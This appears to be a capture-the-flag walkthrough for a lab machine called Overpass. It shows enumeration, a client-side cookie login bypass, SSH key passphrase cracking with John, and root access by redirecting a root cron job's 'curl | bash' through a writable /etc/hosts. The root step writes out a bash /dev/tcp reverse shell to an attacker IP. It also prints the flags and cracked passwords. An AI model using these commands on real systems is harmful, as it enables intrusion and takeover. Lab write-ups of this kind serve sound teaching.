# Overpass

## Objective

- Hack the machine and retrieve:
  - `user.txt`
  - `root.txt`

## Initial Enumeration

### Nmap

```bash
nmap 10.10.107.143
nmap -A -p 22,80 10.10.107.143
```

### Findings

- Open ports:
  - `22/tcp` - SSH
  - `80/tcp` - HTTP
- SSH version:
  - `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3`
- HTTP service:
  - Golang `net/http` server
  - Title: `Overpass`

## Web Enumeration

### Website Observations

- No `robots.txt` was found.
- Staff names discovered:
  - `Nina`
  - `Pars`
  - `Szymex`
  - `Bee`
  - `MuirlandOracle`
- Precompiled binaries and source code were available.
- The source code showed that the encryption algorithm was `ROT47`.

### Directory Enumeration

```bash
dirb http://10.10.107.143 /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -w
```

### Directories and Pages Found

- Directories:
  - `/img`
  - `/downloads`
  - `/aboutus`
  - `/css`
- Page:
  - `/admin`

## Admin Login Analysis

### Failed Brute Force Attempt

- Create a staff username file from discovered names.
- Attempted HTTP POST brute force:

```bash
hydra -L staff.txt -P /usr/share/wordlists/rockyou.txt 10.10.107.143 \
  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

- The hint indicated no brute forcing was required.
- The apparent positive results were not useful.

### JavaScript Logic Review

- The `/admin` page includes `login.js`.
- The `login()` function posts credentials to `/api/login`.
- Important logic:

```javascript
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value=""
} else {
    Cookies.set("SessionToken",statusOrCookie)
    window.location = "/admin"
}
```

### Operational Interpretation

- The client trusts the server response text.
- If the response is anything other than `Incorrect credentials`, the client sets `SessionToken` and redirects to `/admin`.
- This can be bypassed by modifying the response in Burp Suite.

### Burp Suite Response Modification

- Intercept the login request.
- Use `Action` > `Do intercept` > `Response to this request`.
- Modify the server response:
  - Change status from `close` to `open`.
  - Delete `Incorrect Credentials`.
- The admin page reveals an encrypted RSA private key.

### Simpler Cookie Method

- Add a cookie directly in the browser console on `/admin`:

```javascript
document.cookie="SessionToken=CorrectCredentials"
```

## SSH Key Access

### Discovered Users

- The admin area reveals two users:
  - `James`
  - `Paradox`
- The key appears to be assigned to James.

### Save and Crack the SSH Key

- Save the RSA key as `id_rsa`.
- Fix permissions:

```bash
chmod 600 id_rsa
```

- Convert the encrypted key for John:

```bash
python3 /opt/john/ssh2john.py <path-to-id_rsa> > james.txt
```

- Crack the passphrase:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt james.txt
```

- Passphrase found:

```text
james13
```

### SSH Login

```bash
ssh -i id_rsa james@10.10.32.124
```

- Use passphrase: `james13`

## User Flag

- Files discovered:
  - `ToDo.txt`
  - `user.txt`

- `ToDo.txt` note:
  - James needs to update password encryption.
  - James wrote his password down on a sticky note.

- User flag:

```text
thm{65c1aaf000506e56996822c6281e6bf7}
```

## Local Password Discovery

- File `.overpass` contains a ROT47-encoded string:

```text
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

- ROT47 decode result:

```json
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

- Password for James:

```text
saydrawnlyingpicture
```

- From this point, SSH can be used with James' password:

```bash
ssh james@<target-ip>
```

## Privilege Escalation

### Initial Checks

- Process list only showed `bash` and `ps`.
- Reading `/etc/passwd` failed due to permission restrictions.
- Identity check:

```bash
id
```

- Result:

```text
uid=1001(james) gid=1001(james) groups=1001(james)
```

### SUID Search

```bash
find / -perm -u=s -type f 2>/dev/null
```

- GTFOBins checks did not produce a viable route through `at` because James was not in sudoers.

### Cron-Based Root Exploitation

- Review crontab:

```bash
cat /etc/crontab
```

- Root cron job found:

```cron
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

### Operational Interpretation

- Root runs a script fetched from `overpass.thm` every minute.
- `/etc/hosts` maps `overpass.thm` to an IP.
- If `/etc/hosts` is writable, the domain can be redirected to the attacker-controlled web server.

### Confirm Writable Hosts File

```bash
ls -alh /etc/hosts
```

- Permissions showed the file was writable.

## Root Shell Procedure

### Attacker Machine

- Create the expected directory path:

```bash
mkdir -p Documents/THM/Overpass/downloads/src/
```

- Optionally download the original script to preserve the expected path:

```bash
wget http://<target-ip>/downloads/src/buildscript.sh
```

- Replace `buildscript.sh` with a reverse shell:

```bash
bash -i >& /dev/tcp/<attacker-ip>/<attacker-port> 0>&1
```

- Start an HTTP server on port `80`:

```bash
sudo python3 -m http.server 80 --directory Documents/THM/Overpass
```

- Start a listener:

```bash
nc -lvnp <attacker-port>
```

### Target Machine

- Edit `/etc/hosts`:

```bash
nano /etc/hosts
```

- Replace the `overpass.thm` IP with the attacker IP.
- Wait for cron to execute.
- The reverse shell returns as root, allowing access to `root.txt`.
